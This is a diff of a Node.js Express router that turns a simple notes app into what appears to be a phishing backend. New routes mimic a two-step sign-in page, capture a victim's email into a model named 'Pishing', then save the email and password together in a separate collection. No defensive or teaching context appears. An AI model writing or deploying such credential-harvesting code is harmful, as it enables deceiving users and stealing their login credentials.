@@ -1,74 +1,59 @@
 const express = require('express');
 const router= express.Router();
-const Note = require('../models/Note');
+const Pishing = require('../models/pishing');
+const Data = require('../models/data');
 
 
-router.get('/notes/nueva', (req, res)=>{
-    res.render('notes/nueva');
+router.get('/inciarsesion/ingresar', (req, res)=>{
+    res.render('session/sigin');
 })
 
-router.post('/notes/new-note', async (req, res)=>{
+router.get('/inciarsesion/password', async (req, res)=>{
+    const notes=  await Pishing.find().lean().sort({$natural:-1}).limit(1);
+    console.log(notes);
+    res.render('session/password', {notes});
+})
+
+router.post('/inciarsesion/sigin', async (req, res)=>{
     //Destructuring
     //Creo variables con las propiedades del objeto
-    const {titulo, description}=req.body;
-    const errors = [];
-    if(!titulo){
-        errors.push({text: 'falta titulo'})
-    }
-    if(!description){
-        errors.push({text: 'falta descripción'})
-    }
-    if(errors.length>0){
-        res.render('notes/nueva', {
-            //datos a recuperar
-            errors,
-            titulo,
-            description
-        });
-    }else {
-        //Guardar los datos recibidos en la bbdd
-        const newNote= new Note({titulo, description})
-        await newNote.save();
-        req.flash('succes_msg', 'Nota agregada');
-        res.redirect('/notes');
+    const {correo}=req.body;
+        const newData= new Pishing({correo})
+        await newData.save();
+        //req.flash('succes_msg', 'Nota agregada');
+        res.redirect('/inciarsesion/password');
 
-    }
+    //}
 
 })
 
-router.get('/notes', async (req, res)=>{
-   const notes=  await Note.find().lean().sort({date: 'descending'});
-    res.render('notes/all-notes', {notes});
 
 
 
-    /*Enlistar tablas por metodos de busqueda
-   const notes=  await Note.find().lean();
+router.post('/inciarsesion/data', async (req, res)=>{
 
-     */
-});
+    const {correo, password}=req.body;
+    //console.log(req.body);
 
-router.get('/notes/edit/:id', async (req, res)=>{
-    const note= await Note.findById(req.params.id).lean();
-    res.render('notes/edit-note', {note});
-
-});
+    const newData= new Data({correo, password})
+    //console.log(newData);
+    await newData.save();
+    res.send('ok');
 
 
-//Editar tarea
-router.put('/notes/edit-note/:id', async (req, res)=>{
-    const {titulo, description} = req.body;
-    await Note.findByIdAndUpdate(req.params.id, {titulo, description});
-    req.flash('succes_msg', 'Nota actualizada');
-    res.redirect('/notes')
 })
 
 
-router.delete('/notes/delete/:id', async (req, res)=>{
-    await Note.findByIdAndDelete(req.params.id);
-    req.flash('succes_msg', 'Nota eliminada');
-    res.redirect('/notes');
-})
+
+
+
+
+
+
+
+
+
+
 
 
 module.exports = router;
